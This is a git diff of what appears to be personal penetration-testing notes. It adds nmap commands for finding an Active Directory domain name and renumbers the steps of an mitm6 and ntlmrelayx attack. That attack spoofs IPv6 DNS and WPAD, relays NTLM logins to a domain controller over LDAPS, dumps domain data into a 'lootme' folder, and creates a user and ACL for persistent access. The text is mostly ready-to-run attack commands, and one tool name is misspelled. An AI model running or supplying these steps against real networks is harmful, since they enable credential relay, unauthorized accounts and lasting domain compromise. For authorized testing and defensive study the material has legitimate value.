@@ -159,16 +159,27 @@ OR:
 ```
 nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
 ```
-3. run mitm6
+3. get Domain name using nmap
+```
+nmap --script smb-enum-domains.nse -p445 <host>
+sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
+```
+OR:
+```
+nmap --script smb-os-discovery.nse -p445 127.0.0.1
+sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
+```
+
+4. run mitm6
 ```
 sudo python mitm6.py -d <domain>.local
 ```
 
-4. run ntmlrelayx.py at the same time
+5. run ntmlrelayx.py at the same time
 ```
 ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
 ```
-5. check on results:
+6. check on results:
 all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
 ```
 firefox ./lootme/domain_users.html
